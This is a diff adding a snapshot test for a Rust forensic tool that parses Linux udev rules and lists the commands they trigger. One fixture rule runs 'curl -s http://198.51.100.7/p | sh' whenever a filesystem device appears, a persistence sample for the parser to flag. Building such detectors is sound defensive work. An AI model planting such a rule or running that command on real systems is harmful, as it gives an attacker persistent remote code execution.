@@ -1,0 +1,10 @@
+---
+source: crates/nixcavate-artifacts/src/linux/udev_rules.rs
+expression: "run(&ARTIFACT, PATH, &fixture(\"udev-rules/99-local.rules\"), 0)"
+---
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":2,"action":"run","command":"/usr/local/bin/usb-added.sh %k","rule":"ACTION==\"add\", SUBSYSTEM==\"usb\", ATTR{idVendor}==\"1234\", ATTR{idProduct}==\"abcd\", RUN+=\"/usr/local/bin/usb-added.sh %k\""}
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":3,"action":"run","command":"/bin/sh -c 'curl -s http://198.51.100.7/p | sh'","rule":"SUBSYSTEM==\"block\", ENV{ID_FS_USAGE}==\"filesystem\", RUN{program}+=\"/bin/sh -c 'curl -s http://198.51.100.7/p | sh'\", RUN+=\"/usr/bin/logger \\\"disk %k\\\"\""}
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":3,"action":"run","command":"/usr/bin/logger \\\"disk %k\\\"","rule":"SUBSYSTEM==\"block\", ENV{ID_FS_USAGE}==\"filesystem\", RUN{program}+=\"/bin/sh -c 'curl -s http://198.51.100.7/p | sh'\", RUN+=\"/usr/bin/logger \\\"disk %k\\\"\""}
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":6,"action":"program","command":"/lib/udev/scsi_id -g -u /dev/%k","rule":"KERNEL==\"sda\", PROGRAM=\"/lib/udev/scsi_id -g -u /dev/%k\", SYMLINK+=\"disk/by-id/%c\""}
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":7,"action":"import_program","command":"/usr/lib/udev/net_id %p","rule":"SUBSYSTEM==\"net\", IMPORT{program}=\"/usr/lib/udev/net_id %p\""}
+{"host":"memory","artifact":"udev-rules","source_path":"etc/udev/rules.d/99-local.rules","source_line":8,"action":"run","command":"kmod load","rule":"ACTION==\"add\", RUN{builtin}=\"kmod load\""}
